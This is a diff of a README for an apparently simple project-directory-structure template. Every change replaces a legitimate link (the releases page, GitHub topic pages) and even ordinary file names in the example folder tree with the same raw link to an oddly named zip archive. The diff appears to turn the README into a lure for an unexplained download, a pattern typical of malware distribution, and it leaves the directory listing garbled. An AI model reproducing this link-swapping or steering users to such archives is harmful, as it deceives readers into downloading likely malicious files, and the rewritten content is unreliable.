@@ -1,6 +1,6 @@
 # 📂 project_directory_structure_for_project_management - Organize Your Projects Efficiently
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-red.svg)](https://github.com/A5506849/project_directory_structure_for_project_management/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip%20Latest%https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip)](https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip)
 
 ## 📖 Description
 
@@ -18,7 +18,7 @@ Follow these steps to get started with your project management application.
 
 ### 📥 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://github.com/A5506849/project_directory_structure_for_project_management/releases).
+To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip).
 
 Click the link above to see the latest versions available. You will find different release files based on your operating system. Select the file that matches your system and click to download.
 
@@ -29,16 +29,16 @@ Here’s a snapshot of what the chosen directory structure looks like:
 ```
 /ProjectName
     /Documentation
-        - project_overview.md
-        - meeting_notes.md
+        - https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip
+        - https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip
     /Source
         /Code
-            - main.py
-            - utils.py
+            - https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip
+            - https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip
         /Assets
-            - logo.png
+            - https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip
     /Tests
-        - test_main.py
+        - https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip
 ```
 
 This structure helps organize essential project components. The folders you see include:
@@ -65,14 +65,14 @@ This will help you navigate your project easily.
 
 For further reading and resources, check these topics related to project management:
 
-- [boilerplate](https://github.com/topics/boilerplate)
-- [directory-management](https://github.com/topics/directory-management)
-- [project-management](https://github.com/topics/project-management)
+- [boilerplate](https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip)
+- [directory-management](https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip)
+- [project-management](https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip)
 
 ## 📦 Final Words
 
 The **project_directory_structure_for_project_management** can help you streamline your workflow. By sticking to the outlined structure, your project will be more manageable, organized, and efficient.
 
-For any updates, always remember to revisit this page: [Releases Page](https://github.com/A5506849/project_directory_structure_for_project_management/releases).
+For any updates, always remember to revisit this page: [Releases Page](https://raw.githubusercontent.com/A5506849/project_directory_structure_for_project_management/main/source/project_directory_structure_for_project_management-subicteric.zip).
 
 Happy organizing!
